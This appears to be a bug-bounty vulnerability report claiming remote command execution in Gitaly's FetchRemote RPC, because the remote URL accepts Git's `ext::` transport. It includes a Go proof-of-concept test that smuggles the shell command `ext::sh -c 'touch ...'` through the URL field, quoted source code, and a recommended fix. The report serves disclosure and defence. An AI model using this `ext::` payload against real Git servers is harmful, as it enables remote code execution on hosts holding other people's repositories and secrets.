### Title
Arbitrary command execution via `ext::` transport helper in `FetchRemoteRequest.remote_params.url` - ([File: internal/gitaly/service/repository/fetch_remote.go])

### Summary
`buildCommandOpts` in `fetch_remote.go` takes `req.GetRemoteParams().GetUrl()` and writes it verbatim into the `remote.inmemory.url` git config entry, with no scheme allowlist or validation. Because `git-fetch(1)` is subsequently invoked against this configured remote, an attacker can supply a URL using Git's `ext::` transport helper (or `fd::`), causing the Gitaly host to execute an attacker-controlled shell command.

### Finding Description
`validateFetchRemoteRequest` only checks that the URL is non-blank [1](#0-0) . `buildCommandOpts` then sets `remote.inmemory.url` directly from the raw, attacker-supplied string with no scheme/format restriction: [2](#0-1) . This configuration is passed via `gitcmd.WithConfigEnv(config...)` into `quarantineRepo.FetchRemote(ctx, "inmemory", opts)` [3](#0-2) , which ultimately invokes `git fetch inmemory` [4](#0-3) .

Git natively supports the `ext::<command>` remote helper, which executes `<command>` via the shell to establish the transport. Nowhere in `buildCommandOpts`, `FetchRemote` (localrepo), or the command factory is there a `GIT_ALLOW_PROTOCOL` environment variable set or a scheme allowlist (`http`, `https`, `git`, `ssh`) enforced — a targeted search of the repo for `GIT_ALLOW_PROTOCOL`/`protocol.allow`/`ext::` found no such restriction in the fetch path. Consequently, when `git fetch` resolves the `inmemory` remote's URL of the form `ext::sh -c ...`, git will execute the given shell command directly on the Gitaly node, with the privileges of the `git`/gitaly process.

### Impact Explanation
This is remote command execution on the Gitaly server, matching GitLab's "RCE" bounty impact class — the highest severity bucket. An attacker who can trigger `FetchRemoteRequest` (e.g., via a pull-mirror or repository-import operation on a project they own/control) can execute arbitrary commands on the Gitaly node, potentially compromising all repositories and secrets handled by that node.

### Likelihood Explanation
The attacker only needs the ability to configure a remote URL that gets passed to `FetchRemoteRequest` — a capability normal, unprivileged project owners have via GitLab's pull-mirroring / repository-import-by-URL features (which invoke this RPC). No admin role, stolen credentials, or non-default configuration is required. The exploit is fully repeatable and deterministic since the payload is a static string.

### Recommendation
Validate/allowlist the URL scheme in `buildCommandOpts` (or in `validateFetchRemoteRequest`) before using it, rejecting anything other than `http://`, `https://`, `git://`, and `ssh://`/scp-like syntax. Additionally, set `GIT_ALLOW_PROTOCOL=http:https:git:ssh` (or equivalent `protocol.*.allow` config) in the environment/config passed to the `git fetch` invocation so that git itself refuses `ext::`, `fd::`, and other helper-based transports regardless of upstream validation gaps.

### Proof of Concept
```go
func TestFetchRemote_ExtProtocolRCE(t *testing.T) {
    cfg, repoProto, _ := setupRepositoryService(t) // existing test helpers
    client := newRepositoryClient(t, cfg, ...)

    marker := filepath.Join(t.TempDir(), "pwned")
    req := &gitalypb.FetchRemoteRequest{
        Repository: repoProto,
        RemoteParams: &gitalypb.Remote{
            Url: fmt.Sprintf("ext::sh -c 'touch %s'", marker),
        },
        Timeout: 10,
    }

    _, err := client.FetchRemote(ctx, req)
    // Regardless of the fetch ultimately failing (no real git protocol served),
    // the shell command is executed as a side effect of git resolving the URL.
    require.FileExists(t, marker)
}
```
Expected result today: the `touch` command executes and creates the marker file, demonstrating command execution on the Gitaly host triggered purely by RPC-supplied `remote_params.url`.

```go
func buildCommandOpts(ctx context.Context, opts *localrepo.FetchOpts, req *gitalypb.FetchRemoteRequest) error {
	remoteURL := req.GetRemoteParams().GetUrl()
	var config []gitcmd.ConfigPair

	for _, refspec := range getRefspecs(req.GetRemoteParams().GetMirrorRefmaps()) {
		config = append(config, gitcmd.ConfigPair{
			Key: "remote.inmemory.fetch", Value: refspec,
		})
	}

	if resolvedAddress := req.GetRemoteParams().GetResolvedAddress(); resolvedAddress != "" {
		modifiedURL, resolveConfig, err := gitcmd.GetURLAndResolveConfig(remoteURL, resolvedAddress)
		if err != nil {
			return fmt.Errorf("couldn't get curloptResolve config: %w", err)
		}

		remoteURL = modifiedURL
		config = append(config, resolveConfig...)
	}

	config = append(config, gitcmd.ConfigPair{Key: "remote.inmemory.url", Value: remoteURL})
```

```go
func (s *server) validateFetchRemoteRequest(ctx context.Context, req *gitalypb.FetchRemoteRequest) error {
	if err := s.locator.ValidateRepository(ctx, req.GetRepository()); err != nil {
		return structerr.NewInvalidArgument("%w", err)
	}

	if req.GetRemoteParams() == nil {
		return structerr.NewInvalidArgument("missing remote params")
	}

	if req.GetRemoteParams().GetUrl() == "" {
		return structerr.NewInvalidArgument("blank or empty remote URL")
	}

	return nil
```
